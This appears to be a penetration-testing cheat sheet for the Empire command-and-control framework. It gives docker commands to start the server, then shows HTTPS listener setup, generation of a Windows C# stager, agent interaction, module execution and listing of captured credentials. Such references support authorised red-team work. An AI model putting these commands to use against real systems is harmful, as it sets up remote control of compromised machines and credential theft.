# empire server

% empire, windows, c2
#plateform/linux #target/remote  #cat/C2

## server - pull latest image
```bash
docker pull bcsecurity/empire:latest
```

## server - start
```bash
docker run -it -p 1337:1337 -p 5000:5000 -p 0.0.0.0:<empire_listener_port>:<empire_listener_port> bcsecurity/empire:latest
```

## server - start (persistent storage)
```bash
docker create -v <empire_storage_path> --name data bcsecurity/empire:latest && docker run -it -p 1337:1337 -p 5000:5000  -p 0.0.0.0:<empire_listener_port>:<empire_listener_port> --volumes-from data bcsecurity/empire:latest
```



## client - start
```bash
empire-client --config ~/empire-client.yaml
```

## listerner - create https listener
```bash
uselistener http
set Name <empire_listener_name>
set Host https://<local_ip>
set Port <empire_listener_port> 
set CertPath /empire/server/data
execute
main
```

## listerner - list 
```bash
listeners
```

## listerner - kill
```bash
kill <empire_listener_name>
```

## stager - create csharp
```bash
usestager windows_csharp_exe
set DotNetVersion net35
set Listener <empire_listener_name>
execute
```

## agent - interact
```bash
interact <agent_name>
```

## agent - rename
```bash
rename <old_agent_name> <new_agent_name>
```

## module - library
```bash
https://www.infosecmatter.com/empire-module-library/
```

## module - use
```bash
usemodule <empire_module_name>
set Agent <empire_agent_name>
options
execute
```



## credentials - list
```bash
credentials
```


## plugins - chiselserver
```bash
```

## plugins - socksproxyserver
```bash
```


